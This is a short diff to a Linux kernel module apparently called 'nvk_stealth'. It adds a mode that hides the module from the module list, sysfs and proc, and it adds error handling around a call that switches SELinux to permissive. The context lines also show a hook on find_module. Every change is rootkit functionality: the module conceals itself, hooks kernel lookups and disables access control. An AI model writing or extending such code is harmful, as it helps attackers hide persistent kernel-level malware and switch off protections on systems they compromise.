@@ -68,7 +68,10 @@ static int nvk_stealth_init(void)
 			nvk_log_info("find_module hooked\n");
 	}
 
-#ifdef NVK_STEALTH_HIDE
+#ifdef NVK_STEALTH_FULL_HIDE
+	nvk_mod_full_hide(&hide_state, &__this_module, "nvk_stealth");
+	nvk_log_info("deep-hidden (list+sysfs+proc)\n");
+#elif defined(NVK_STEALTH_HIDE)
 	nvk_mod_hide(&hide_state, &__this_module);
 	nvk_log_info("hidden from lsmod\n");
 #else
@@ -87,8 +90,11 @@ static int nvk_stealth_init(void)
 	if (nvk_selinux_init() == 0) {
 		nvk_log_info("selinux enforcing=%d\n",
 			     nvk_selinux_is_enforcing());
-		nvk_selinux_set_permissive();
-		nvk_log_info("selinux -> permissive\n");
+		ret = nvk_selinux_set_permissive();
+		if (ret == 0)
+			nvk_log_info("selinux -> permissive\n");
+		else
+			nvk_log_warn("selinux set_permissive: %d\n", ret);
 	}
 #endif
 
